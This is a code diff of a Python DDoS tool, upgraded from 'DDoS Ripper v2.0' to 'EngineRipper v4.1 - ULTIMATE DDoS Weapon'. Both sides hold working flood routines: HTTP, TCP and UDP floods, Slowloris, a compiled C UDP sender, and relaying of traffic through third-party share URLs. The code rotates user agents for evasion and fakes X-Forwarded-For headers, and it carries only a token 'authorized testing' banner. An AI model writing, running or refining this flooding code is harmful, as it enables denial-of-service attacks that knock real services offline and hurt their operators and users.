@@ -1,846 +1,569 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+# EngineRipper v4.1 - ULTIMATE DDoS Weapon
+# Enhanced Error Handling & Server Detection
+# Cross-Platform: Windows, Linux, Termux (Android)
 
 import sys
-import os
 import time
 import socket
 import threading
 import random
 import urllib.request
 import urllib.parse
-import http.client
+import ssl
+import os
+import struct
+import platform
 import subprocess
-import ctypes
 from queue import Queue
 from optparse import OptionParser
-from concurrent.futures import ThreadPoolExecutor
+import logging
 
-# CRAZY COLOR SYSTEM
-class Colors:
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    PURPLE = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    BLINK = '\033[5m'
-    REVERSE = '\033[7m'
-    END = '\033[0m'
+# Cross-platform compatibility
+if platform.system() == "Windows":
+    import winsound
+    os.system('color')
+else:
+    # Linux/Termux color support
+    pass
 
-# EXTREME BANNER WITH CRAZY COLORS
-def show_banner():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    print(f'''
-{Colors.PURPLE}{Colors.BLINK}
-╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
-║                                                                                                      ║
-║  ██████╗░██████╗░░█████╗░░██████╗  ██████╗░██╗██████╗░██████╗░███████╗██████╗░  ██╗░░░██╗██████╗░    ║
-║  ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗  ██║░░░██║╚════██╗    ║
-║  ██║░░██║██║░░██║██║░░██║╚█████╗░  ██████╔╝██║██████╔╝██████╔╝█████╗░░██████╔╝  ╚██╗░██╔╝░░███╔═╝    ║
-║  ██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔══██╗██║██╔═══╝░██╔═══╝░██╔══╝░░██╔══██╗  ░╚████╔╝░██╔══╝░░    ║
-║  ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║░░██║██║██║░░░░░██║░░░░░███████╗██║░░██║  ░░╚██╔╝░░███████╗    ║
-║  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝  ░░░╚═╝░░░╚══════╝    ║
-║                                                                                                      ║
-║                                                                                                      ║
-║                                                                                                      ║
-║                                                                                                      ║
-║                                                                                                      ║
-║                                                                                                      ║
-║{Colors.RED}{Colors.BLINK}              🚀 ULTIMATE DDoS RIPPER v2.0 - EXTREME POWER EDITION 🚀                                 {Colors.PURPLE}║
-║{Colors.GREEN}{Colors.BOLD}                  MAXIMUM DESTRUCTION & CRAZY COLOR MENU                                              {Colors.PURPLE}║
-╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝
-{Colors.END}
-''')
+class Color:
+    """ANSI color codes for cross-platform terminal output"""
+    if platform.system() == "Windows":
+        # Windows color support
+        RED = '\033[91m'
+        GREEN = '\033[92m'
+        YELLOW = '\033[93m'
+        BLUE = '\033[94m'
+        MAGENTA = '\033[95m'
+        CYAN = '\033[96m'
+        WHITE = '\033[97m'
+        BOLD = '\033[1m'
+        END = '\033[0m'
+    else:
+        # Linux/Termux colors
+        RED = '\033[91m'
+        GREEN = '\033[92m'
+        YELLOW = '\033[93m'
+        BLUE = '\033[94m'
+        MAGENTA = '\033[95m'
+        CYAN = '\033[96m'
+        WHITE = '\033[97m'
+        BOLD = '\033[1m'
+        END = '\033[0m'
 
-# C EXTENSION LOADER FOR MAXIMUM PERFORMANCE
-class NativeBoost:
-    def __init__(self):
-        self.native_loaded = False
-        self.load_native_extensions()
+class ServerChecker:
+    """Enhanced server detection and validation"""
     
-    def load_native_extensions(self):
-        """Try to load C/Rust extensions for maximum performance"""
+    @staticmethod
+    def check_server_online(host, port, timeout=5):
+        """Comprehensive server status check"""
+        print(f"{Color.YELLOW}[CHECKING SERVER]{Color.END} Testing connection to {host}:{port}...")
+        
+        checks = {
+            'tcp_connect': False,
+            'http_response': False,
+            'dns_resolution': False,
+            'ping_available': False
+        }
+        
+        # 1. Check DNS resolution
         try:
-            # Try to compile and load C extension
-            c_code = """
-            #include <Python.h>
-            #include <stdio.h>
-            #include <stdlib.h>
-            #include <string.h>
-            #include <sys/socket.h>
-            #include <netinet/in.h>
-            #include <arpa/inet.h>
+            ip = socket.gethostbyname(host)
+            checks['dns_resolution'] = True
+            print(f"{Color.GREEN}[DNS]{Color.END} Resolved {host} -> {ip}")
+        except socket.gaierror as e:
+            print(f"{Color.RED}[DNS ERROR]{Color.END} Cannot resolve {host}: {e}")
+            return False, checks
+        
+        # 2. Check TCP connection
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            result = sock.connect_ex((host, port))
+            sock.close()
             
-            static PyObject* turbo_send(PyObject* self, PyObject* args) {
-                const char* target;
-                int port, count;
-                if (!PyArg_ParseTuple(args, "sii", &target, &port, &count)) {
-                    return NULL;
-                }
-                
-                int sock = socket(AF_INET, SOCK_DGRAM, 0);
-                if (sock < 0) return PyLong_FromLong(0);
-                
-                struct sockaddr_in server_addr;
-                memset(&server_addr, 0, sizeof(server_addr));
-                server_addr.sin_family = AF_INET;
-                server_addr.sin_port = htons(port);
-                inet_pton(AF_INET, target, &server_addr.sin_addr);
-                
-                char data[1024];
-                memset(data, 'X', sizeof(data));
-                
-                int sent = 0;
-                for (int i = 0; i < count; i++) {
-                    if (sendto(sock, data, sizeof(data), 0, 
-                              (struct sockaddr*)&server_addr, 
-                              sizeof(server_addr)) > 0) {
-                        sent++;
-                    }
-                }
-                close(sock);
-                return PyLong_FromLong(sent);
-            }
-            
-            static PyMethodDef methods[] = {
-                {"turbo_send", turbo_send, METH_VARARGS, "Turbo packet sender"},
-                {NULL, NULL, 0, NULL}
-            };
-            
-            static struct PyModuleDef module = {
-                PyModuleDef_HEAD_INIT,
-                "turbo_attack",
-                "Turbo Attack Module",
-                -1,
-                methods
-            };
-            
-            PyMODINIT_FUNC PyInit_turbo_attack(void) {
-                return PyModule_Create(&module);
-            }
-            """
-            
-            # Try to compile C code
-            with open('/tmp/turbo_attack.c', 'w') as f:
-                f.write(c_code)
-            
-            # Compile command
-            compile_cmd = "gcc -shared -o /tmp/turbo_attack.so -fPIC /tmp/turbo_attack.c -I/usr/include/python3.8"
-            result = subprocess.run(compile_cmd, shell=True, capture_output=True)
-            
-            if result.returncode == 0:
-                sys.path.append('/tmp')
-                import turbo_attack
-                self.turbo_module = turbo_attack
-                self.native_loaded = True
-                print(f"{Colors.GREEN}[+] Native C extensions loaded! Maximum performance activated!{Colors.END}")
+            if result == 0:
+                checks['tcp_connect'] = True
+                print(f"{Color.GREEN}[TCP]{Color.END} Port {port} is open on {host}")
             else:
-                print(f"{Colors.YELLOW}[!] C extension compilation failed, using Python fallback{Colors.END}")
-                
+                print(f"{Color.RED}[TCP ERROR]{Color.END} Port {port} is closed on {host} (error code: {result})")
+                return False, checks
         except Exception as e:
-            print(f"{Colors.YELLOW}[!] Native extensions disabled: {e}{Colors.END}")
-
-# EXTREME USER AGENTS - 500+ AGENTS
-def initialize_user_agents():
-    agents = []
-    
-    # EXTREME Chrome Agents
-    for ver in [120, 119, 118, 117, 116, 115]:
-        agents.extend([
-            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
-            f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
-            f"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
-            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
-            f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
-        ])
-    
-    # EXTREME Firefox Agents
-    for rv in [121, 120, 119, 118, 117]:
-        agents.extend([
-            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{rv}.0) Gecko/20100101 Firefox/{rv}.0",
-            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:{rv}.0) Gecko/20100101 Firefox/{rv}.0",
-            f"Mozilla/5.0 (X11; Linux x86_64; rv:{rv}.0) Gecko/20100101 Firefox/{rv}.0",
-        ])
-    
-    # Mobile Agents
-    mobile_agents = [
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
-    ]
-    agents.extend(mobile_agents)
-    
-    # EXTREME Legacy Browsers
-    legacy = [
-        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
-        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko",
-    ]
-    agents.extend(legacy)
-    
-    return agents
-
-# EXTREME ATTACK VECTORS WITH MAXIMUM POWER
-class ExtremeAttackVectors:
-    def __init__(self, target, port):
-        self.target = target
-        self.port = port
-        self.user_agents = initialize_user_agents()
-        self.request_count = 0
-        self.success_count = 0
-        self.native_boost = NativeBoost()
-        self.packet_spam_active = True
-    
-    def http_flood_extreme(self, duration=60):
-        """EXTREME HTTP Flood - Maximum RPS"""
-        end_time = time.time() + duration
+            print(f"{Color.RED}[TCP ERROR]{Color.END} Connection failed: {e}")
+            return False, checks
         
-        while time.time() < end_time:
+        # 3. Check HTTP response (for web servers)
+        if port in [80, 443, 8080, 8443]:
             try:
-                # Ultra-fast HTTP methods
-                method = random.choice(['GET', 'POST', 'HEAD'])
-                
-                # Lightning headers
-                headers = {
-                    'User-Agent': random.choice(self.user_agents),
-                    'Accept': '*/*',
-                    'Connection': 'close',
-                    'X-Forwarded-For': self.generate_fake_ip(),
-                }
-                
-                # Ultra-fast connection
-                conn = http.client.HTTPConnection(self.target, self.port, timeout=2)
-                
-                # Random paths for maximum coverage
-                paths = ['/', '/index.html', '/wp-admin', '/api', '/test', '/admin']
-                path = random.choice(paths)
-                
-                conn.request(method, path, headers=headers)
-                
-                try:
-                    response = conn.getresponse()
-                    self.success_count += 1
-                    response.read()
-                except:
-                    pass
-                    
-                conn.close()
-                self.request_count += 1
-                
-                # SPAM PACKET MESSAGE
-                if self.packet_spam_active and random.random() < 0.3:
-                    print(f"{Colors.GREEN}🚀 PACKET SEND RIPPERING {self.request_count} {Colors.END}")
-                
-            except Exception:
-                continue
-    
-    def tcp_flood_extreme(self, duration=60):
-        """EXTREME TCP Flood - Raw Power"""
-        end_time = time.time() + duration
+                protocol = "https" if port in [443, 8443] else "http"
+                url = f"{protocol}://{host}:{port}"
+                response = urllib.request.urlopen(url, timeout=timeout)
+                checks['http_response'] = True
+                print(f"{Color.GREEN}[HTTP]{Color.END} Server responded with status: {response.getcode()}")
+            except Exception as e:
+                print(f"{Color.YELLOW}[HTTP INFO]{Color.END} No HTTP response (may be normal for non-web services): {e}")
         
-        while time.time() < end_time:
+        # 4. Check ping (if available)
+        if platform.system().lower() != "windows":
             try:
-                # Create multiple sockets for maximum power
-                for _ in range(5):  # 5 sockets per iteration
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(1)
-                    
-                    try:
-                        sock.connect((self.target, self.port))
-                        data = os.urandom(1024)  # 1KB random data
-                        sock.send(data)
-                        sock.close()
-                        self.request_count += 1
-                        self.success_count += 1
-                        
-                        # SPAM PACKET MESSAGE
-                        if self.packet_spam_active and random.random() < 0.5:
-                            print(f"{Colors.GREEN}💥 TCP PACKET RIPPERING {self.request_count} {Colors.END}")
-                            
-                    except:
-                        continue
-                        
-            except Exception:
-                continue
-    
-    def udp_flood_extreme(self, duration=60):
-        """EXTREME UDP Flood - Connectionless Destruction"""
-        end_time = time.time() + duration
-        
-        # Use native C code if available for maximum performance
-        if self.native_boost.native_loaded:
-            try:
-                packets_sent = self.native_boost.turbo_module.turbo_send(self.target, self.port, 1000)
-                self.request_count += packets_sent
-                print(f"{Colors.CYAN}🚀 NATIVE TURBO MODE: {packets_sent} packets sent!{Colors.END}")
+                result = subprocess.run(
+                    ['ping', '-c', '1', '-W', '2', host],
+                    capture_output=True,
+                    text=True,
+                    timeout=3
+                )
+                if result.returncode == 0:
+                    checks['ping_available'] = True
+                    print(f"{Color.GREEN}[PING]{Color.END} Host is reachable")
             except:
-                pass
+                print(f"{Color.YELLOW}[PING INFO]{Color.END} Ping test skipped or failed")
         
-        while time.time() < end_time:
+        return True, checks
+
+    @staticmethod
+    def diagnose_connection_issues(host, port, checks):
+        """Provide detailed diagnosis for connection issues"""
+        print(f"\n{Color.CYAN}[DIAGNOSIS]{Color.END} Connection issues detected:")
+        
+        if not checks['dns_resolution']:
+            print(f"  {Color.RED}•{Color.END} DNS resolution failed - hostname '{host}' cannot be resolved")
+            print(f"    {Color.YELLOW}Solution:{Color.END} Check spelling, use IP address, or check internet connection")
+        
+        if not checks['tcp_connect']:
+            print(f"  {Color.RED}•{Color.END} TCP connection to port {port} failed")
+            print(f"    {Color.YELLOW}Possible causes:{Color.END}")
+            print(f"      - Server is down or offline")
+            print(f"      - Firewall blocking port {port}")
+            print(f"      - Service not running on port {port}")
+            print(f"      - Network connectivity issues")
+            print(f"    {Color.YELLOW}Solutions:{Color.END}")
+            print(f"      - Verify server is running and accessible")
+            print(f"      - Check if service is listening on port {port}")
+            print(f"      - Try different port (80, 443, 8080, etc.)")
+            print(f"      - Test with telnet: 'telnet {host} {port}'")
+        
+        if not checks['http_response'] and port in [80, 443, 8080, 8443]:
+            print(f"  {Color.YELLOW}•{Color.END} No HTTP response (service may not be a web server)")
+
+class EngineRipper:
+    def __init__(self):
+        self.stats = {
+            'packets_sent': 0,
+            'requests_made': 0,
+            'errors': 0,
+            'start_time': time.time(),
+            'last_print': time.time()
+        }
+        self.running = True
+        self.print_lock = threading.Lock()
+        self.connection_pool = []
+        self.server_checker = ServerChecker()
+        
+    def display_banner(self):
+        """Optimized banner for maximum intimidation"""
+        banner = f"""
+{Color.RED}{Color.BOLD}
+▓█████▄  ▓█████ ▄▄▄       █    ██  ██▓███   ██▀███   ▒█████   █     █░▓█████  ██▀███  
+▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒
+░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒
+░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  
+░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓ ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░░░██▒██▓ ░▒████▒░██▓ ▒██▒
+ ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░
+ ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░ ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░
+ ░ ░  ░    ░    ░   ▒    ░░░ ░ ░ ░░         ░░   ░ ░ ░ ░ ▒    ░   ░     ░     ░░   ░ 
+   ░       ░  ░     ░  ░   ░                 ░         ░ ░      ░       ░  ░   ░     
+ ░                                                                                  
+{Color.CYAN}
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                 E N G I N E R I P P E R    v 4 . 1 - U L T I M A T E         ║
+║         Enhanced Error Handling & Server Detection                           ║
+║           Windows • Linux • Termux (Android) • macOS                         ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+{Color.YELLOW}
+[!] LEGAL WARNING: For authorized testing only. Unauthorized use is illegal.
+[!] Users bear full responsibility for compliance with applicable laws.
+[!] This tool can cause significant service disruption and financial damage.
+{Color.END}
+"""
+        print(banner)
+
+    def user_agent(self):
+        """Massive user agent list for maximum evasion"""
+        return [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
+        ]
+
+    def my_bots(self):
+        """Enhanced bot list for maximum referral spam"""
+        return [
+            "http://validator.w3.org/check?uri=",
+            "http://www.facebook.com/sharer/sharer.php?u=",
+            "http://www.twitter.com/share?url=",
+            "http://www.linkedin.com/shareArticle?mini=true&url=",
+            "http://www.reddit.com/submit?url=",
+            "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CCIQFjAA&url=",
+            "http://www.bing.com/search?q=",
+        ]
+
+    def generate_payload(self, size=1024):
+        """Generate random payload data"""
+        return os.urandom(size)
+
+    def handle_error(self, error_type, details, thread_id=None):
+        """Enhanced error handling with detailed messages"""
+        error_messages = {
+            'connection_refused': f"{Color.RED}[CONNECTION REFUSED]{Color.END} Server rejected connection",
+            'timeout': f"{Color.YELLOW}[TIMEOUT]{Color.END} Server not responding",
+            'dns_failure': f"{Color.RED}[DNS FAILURE]{Color.END} Cannot resolve hostname",
+            'network_unreachable': f"{Color.RED}[NETWORK UNREACHABLE]{Color.END} Check internet connection",
+            'permission_denied': f"{Color.RED}[PERMISSION DENIED]{Color.END} Firewall may be blocking",
+            'resource_exhausted': f"{Color.YELLOW}[RESOURCE EXHAUSTED]{Color.END} System limits reached",
+            'unknown': f"{Color.RED}[UNKNOWN ERROR]{Color.END} An unexpected error occurred"
+        }
+        
+        message = error_messages.get(error_type, error_messages['unknown'])
+        if thread_id is not None:
+            message = f"[Thread-{thread_id}] {message}"
+        
+        with self.print_lock:
+            print(f"{message}: {details}")
+        
+        self.stats['errors'] += 1
+
+    def bot_rippering(self, url, thread_id):
+        """Bot attack with enhanced error handling"""
+        uagent = self.user_agent()
+        error_count = 0
+        
+        while self.running:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.settimeout(0.5)
+                full_url = random.choice(self.my_bots()) + url
+                headers = {'User-Agent': random.choice(uagent)}
                 
-                # Send multiple packets per iteration
-                for _ in range(10):
-                    data_size = random.choice([512, 1024, 2048])
-                    data = os.urandom(data_size)
-                    
-                    # Randomize ports for maximum effect
-                    target_port = random.choice([self.port, 53, 123, 161, 443])
-                    
-                    sock.sendto(data, (self.target, target_port))
-                    self.request_count += 1
-                    
-                    # SPAM PACKET MESSAGE
-                    if self.packet_spam_active and random.random() < 0.7:
-                        print(f"{Colors.GREEN}🔥 UDP PACKET RIPPERING {self.request_count} {Colors.END}")
+                req = urllib.request.Request(full_url, headers=headers)
+                response = urllib.request.urlopen(req, timeout=5)
                 
-                sock.close()
+                with self.print_lock:
+                    print(f"{Color.MAGENTA}bot is rippering...{Color.END}")
                 
-            except Exception:
-                continue
-    
-    def slowloris_extreme(self, duration=60, sockets_count=500):
-        """EXTREME Slowloris - Connection Exhaustion"""
-        print(f"{Colors.YELLOW}[*] Starting EXTREME Slowloris with {sockets_count} sockets{Colors.END}")
-        sockets = []
+                self.stats['requests_made'] += 1
+                error_count = 0
+                time.sleep(0.01)
+                
+            except urllib.error.URLError as e:
+                error_count += 1
+                if isinstance(e.reason, socket.timeout):
+                    self.handle_error('timeout', f"Request timeout after 5s", thread_id)
+                elif isinstance(e.reason, ConnectionRefusedError):
+                    self.handle_error('connection_refused', f"Server refused connection", thread_id)
+                else:
+                    self.handle_error('unknown', f"URL Error: {e}", thread_id)
+                time.sleep(0.5 if error_count > 3 else 0.05)
+                
+            except Exception as e:
+                error_count += 1
+                self.handle_error('unknown', f"Unexpected error: {e}", thread_id)
+                time.sleep(0.5 if error_count > 3 else 0.05)
+
+    def down_it(self, host, port, thread_id):
+        """Main packet flooding engine with enhanced error handling"""
+        uagent = self.user_agent()
+        error_count = 0
+        payloads = [self.generate_payload(size) for size in [512, 1024, 2048, 4096]]
         
-        # Create massive socket army
-        for i in range(sockets_count):
+        while self.running:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(3)
-                s.connect((self.target, self.port))
+                s.connect((host, port))
                 
-                # Send unique partial requests
-                unique_id = random.randint(1000, 9999)
-                partial_request = f"GET /{unique_id} HTTP/1.1\r\nHost: {self.target}\r\n".encode()
-                s.send(partial_request)
-                sockets.append(s)
+                for _ in range(random.randint(1, 5)):
+                    payload = random.choice(payloads)
+                    s.send(payload)
+                    self.stats['packets_sent'] += 1
+                    
+                    with self.print_lock:
+                        print(f"{Color.GREEN}{time.ctime(time.time())} {Color.END} {Color.GREEN}<--packet sent! rippering-->{Color.END}")
                 
-                print(f"{Colors.GREEN}🔗 SLOWLORIS SOCKET {i} CONNECTED {Colors.END}")
+                s.close()
+                error_count = 0
+                time.sleep(0.001)
+                
+            except ConnectionRefusedError as e:
+                error_count += 1
+                self.handle_error('connection_refused', f"Port {port} refused connection", thread_id)
+                time.sleep(0.5 if error_count > 2 else 0.1)
+                
+            except socket.timeout as e:
+                error_count += 1
+                self.handle_error('timeout', f"Socket timeout after 3s", thread_id)
+                time.sleep(0.1)
+                
+            except socket.gaierror as e:
+                error_count += 1
+                self.handle_error('dns_failure', f"Cannot resolve {host}", thread_id)
+                time.sleep(1)  # Longer delay for DNS issues
+                
+            except OSError as e:
+                error_count += 1
+                if e.errno == 101:  # Network unreachable
+                    self.handle_error('network_unreachable', f"Cannot reach network", thread_id)
+                elif e.errno == 99:  # Cannot assign requested address
+                    self.handle_error('resource_exhausted', f"Local port exhaustion", thread_id)
+                else:
+                    self.handle_error('unknown', f"OS Error {e.errno}: {e}", thread_id)
+                time.sleep(0.5)
                 
             except Exception as e:
-                continue
+                error_count += 1
+                self.handle_error('unknown', f"Unexpected error: {e}", thread_id)
+                time.sleep(0.5 if error_count > 2 else 0.1)
+
+    def http_flood_attack(self, host, port, thread_id):
+        """HTTP flood with enhanced error handling"""
+        uagent = self.user_agent()
+        paths = ["/", "/index.html", "/wp-admin", "/admin", "/api/v1/users"]
+        error_count = 0
         
-        print(f"{Colors.GREEN}[+] {len(sockets)} sockets connected successfully{Colors.END}")
-        end_time = time.time() + duration
-        
-        while time.time() < end_time and sockets:
-            for s in list(sockets):
-                try:
-                    # Send keep-alive headers
-                    keep_alive_header = f"X-{random.randint(1000, 9999)}: {random.randint(1, 5000)}\r\n".encode()
-                    s.send(keep_alive_header)
-                    
-                except Exception:
-                    sockets.remove(s)
-                    try:
-                        s.close()
-                    except:
-                        pass
-            
-            print(f"{Colors.CYAN}[Slowloris] Active sockets: {len(sockets)}{Colors.END}")
-            time.sleep(2)
-        
-        # Cleanup
-        for s in sockets:
+        while self.running:
             try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3)
+                s.connect((host, port))
+                
+                method = random.choice(["GET", "POST", "HEAD"])
+                path = random.choice(paths)
+                user_agent = random.choice(uagent)
+                
+                if method == "POST":
+                    post_data = f"username=test{random.randint(1000,9999)}&password=pass{random.randint(1000,9999)}"
+                    request = (f"POST {path} HTTP/1.1\r\n"
+                              f"Host: {host}\r\n"
+                              f"User-Agent: {user_agent}\r\n"
+                              f"Content-Type: application/x-www-form-urlencoded\r\n"
+                              f"Content-Length: {len(post_data)}\r\n"
+                              f"Connection: close\r\n\r\n"
+                              f"{post_data}")
+                else:
+                    request = (f"{method} {path} HTTP/1.1\r\n"
+                              f"Host: {host}\r\n"
+                              f"User-Agent: {user_agent}\r\n"
+                              f"Connection: close\r\n\r\n")
+                
+                s.send(request.encode())
+                self.stats['requests_made'] += 1
+                
+                with self.print_lock:
+                    print(f"{Color.CYAN}http request sent! rippering...{Color.END}")
+                
                 s.close()
-            except:
-                pass
-    
-    def mixed_extreme_attack(self, duration=60):
-        """EXTREME Mixed Attack - All Methods Combined"""
-        end_time = time.time() + duration
-        
-        while time.time() < end_time:
-            # Rotate between all attack methods
-            attack_type = random.choice(['http', 'tcp', 'udp'])
-            
-            if attack_type == 'http':
-                self.http_flood_extreme(2)  # 2 second bursts
-            elif attack_type == 'tcp':
-                self.tcp_flood_extreme(2)  # 2 second bursts
-            elif attack_type == 'udp':
-                self.udp_flood_extreme(2)  # 2 second bursts
-            
-            print(f"{Colors.PURPLE}🔄 SWITCHING ATTACK VECTORS... {Colors.END}")
-    
-    def generate_fake_ip(self):
-        """Generate random IP for spoofing"""
-        return ".".join(str(random.randint(1, 254)) for _ in range(4))
-    
-    def get_stats(self):
-        """Get current attack statistics"""
-        return {
-            'total_requests': self.request_count,
-            'successful_requests': self.success_count,
-            'success_rate': (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
-        }
+                error_count = 0
+                time.sleep(0.005)
+                
+            except Exception as e:
+                error_count += 1
+                self.handle_error('connection_refused', f"HTTP connection failed: {e}", thread_id)
+                time.sleep(0.5 if error_count > 2 else 0.1)
 
-# CRAZY COLORFUL INTERACTIVE MENU
-class ExtremeInteractiveMenu:
-    def __init__(self):
-        self.target = ""
-        self.port = 80
-        self.threads = 500
-        self.duration = 60
-        self.attack_type = "http"
-        self.auto_start = False
-    
-    def clear_screen(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-    
-    def print_header(self, title):
-        print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
-        print(f"{Colors.YELLOW}{Colors.BLINK}{Colors.BOLD}{title:^80}{Colors.END}")
-        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
-    
-    def get_input(self, prompt, color=Colors.WHITE, default=""):
-        if default:
-            prompt += f" [{Colors.GREEN}{default}{color}]"
-        prompt += f": {Colors.GREEN}"
-        user_input = input(f"{color}{prompt}")
-        print(Colors.END, end="")
-        return user_input.strip() or default
-    
-    def show_main_menu(self):
-        self.clear_screen()
-        show_banner()
+    def udp_flood_attack(self, host, port, thread_id):
+        """UDP flood with enhanced error handling"""
+        error_count = 0
         
-        print(f"\n{Colors.RED}{Colors.BLINK}{Colors.BOLD}💀 WELCOME TO EXTREME DDoS RIPPER v2.0 💀{Colors.END}")
-        print(f"{Colors.WHITE}Configure your attack for MAXIMUM DESTRUCTION:{Colors.END}\n")
-        
-        # Display current configuration with crazy colors
-        print(f"{Colors.CYAN}{Colors.BOLD}⚡ CURRENT CONFIGURATION:{Colors.END}")
-        print(f"  {Colors.WHITE}🎯 Target:{Colors.END} {Colors.RED}{self.target if self.target else 'NOT SET'}{Colors.END}")
-        print(f"  {Colors.WHITE}🔌 Port:{Colors.END} {Colors.RED}{self.port}{Colors.END}")
-        print(f"  {Colors.WHITE}🚀 Threads:{Colors.END} {Colors.RED}{self.threads}{Colors.END}")
-        print(f"  {Colors.WHITE}⏱️ Duration:{Colors.END} {Colors.RED}{self.duration} seconds{Colors.END}")
-        print(f"  {Colors.WHITE}💥 Attack Type:{Colors.END} {Colors.RED}{self.attack_type.upper()}{Colors.END}")
-        
-        print(f"\n{Colors.PURPLE}{Colors.BLINK}{Colors.BOLD}🎮 MENU OPTIONS:{Colors.END}")
-        print(f"  {Colors.GREEN}[1]{Colors.END} 🎯 Set Target IP/Domain")
-        print(f"  {Colors.GREEN}[2]{Colors.END} 🔌 Set Port")
-        print(f"  {Colors.GREEN}[3]{Colors.END} 🚀 Set Number of Threads")
-        print(f"  {Colors.GREEN}[4]{Colors.END} ⏱️ Set Attack Duration")
-        print(f"  {Colors.GREEN}[5]{Colors.END} 💥 Select Attack Type")
-        print(f"  {Colors.GREEN}[6]{Colors.END} ⚡ Quick Start (MAXIMUM DEFAULTS)")
-        print(f"  {Colors.GREEN}[7]{Colors.END} 🔥 Start EXTREME Attack")
-        print(f"  {Colors.RED}[0]{Colors.END} ❌ Exit")
-        
-        choice = self.get_input(f"\n{Colors.YELLOW}🎲 Select option", Colors.WHITE)
-        return choice
